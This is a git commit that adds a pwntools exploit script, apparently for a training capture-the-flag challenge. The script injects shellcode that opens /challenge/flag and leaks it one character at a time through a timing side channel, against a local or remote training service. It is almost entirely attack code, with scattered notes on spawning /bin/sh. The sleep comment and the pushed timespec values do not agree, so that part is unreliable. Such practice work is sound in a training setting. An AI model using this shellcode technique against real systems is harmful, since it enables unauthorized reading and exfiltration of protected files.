c8fbf2b45fb41c3dfe556cce6fb16e12c9412626
Khalil El Hage Kassem <90007227+Khalil002@users.noreply.github.com>
2025-10-02 05:32:13 +0200

    Create e.py

---
+++ c7/e.py
@@ -0,0 +1,69 @@
+from pwn import *
+
+COMMANDS = """
+b*0x40116e
+continue
+"""
+
+def create_timing_shellcode(position, character):
+    shellcode = asm(f'''
+        /* Open /challenge/flag */
+        mov rax, 0x00000067616c662f
+        push rax
+        mov rax, 0x656c6c656e616863
+        push rax
+        mov rdi, rsp
+        xor rsi, rsi
+        xor rdx, rdx
+        mov rax, 2
+        syscall
+        
+        /* Read flag into stack */
+        mov rdi, rax
+        sub rsp, 0x100
+        mov rsi, rsp
+        mov rdx, 0x100
+        xor rax, rax
+        syscall
+        
+        /* Check character at position {position} */
+        cmp byte ptr [rsi + {position}], {character}
+        jne skip
+        
+        /* If match, nanosleep for 0.1 seconds */
+        push 0
+        push 1000000000
+        mov rsi, rsp
+        xor rdi, rdi
+        mov rax, 35
+        syscall
+        add rsp, 16
+        
+    skip:
+        xor rdi, rdi
+        mov rax, 60
+        syscall
+    ''')
+    
+    return shellcode.ljust(1024, b'\x90')
+
+shellcode = create_timing_shellcode(0, ord("I"))
+
+#ncat --ssl back-to-shell.training.offensivedefensive.it 8080
+if args.GDB:
+    p = gdb.debug("./benchmarking_service", gdbscript=COMMANDS)
+elif args.REMOTE:
+    p = remote("benchmarking-service.training.offensivedefensive.it", 8080, ssl=True)
+else:
+    p = process("./benchmarking_service")
+p.send(shellcode)
+p.interactive()
+
+#0x40116e
+
+#execve("/bin/sh\0", NULL, NULL)
+
+#(rdi, rsi, rdx), r10, r8, r9
+#const char *filename, const char *const *argv, const char *const *envp
+
+0x7ffeeec9e500
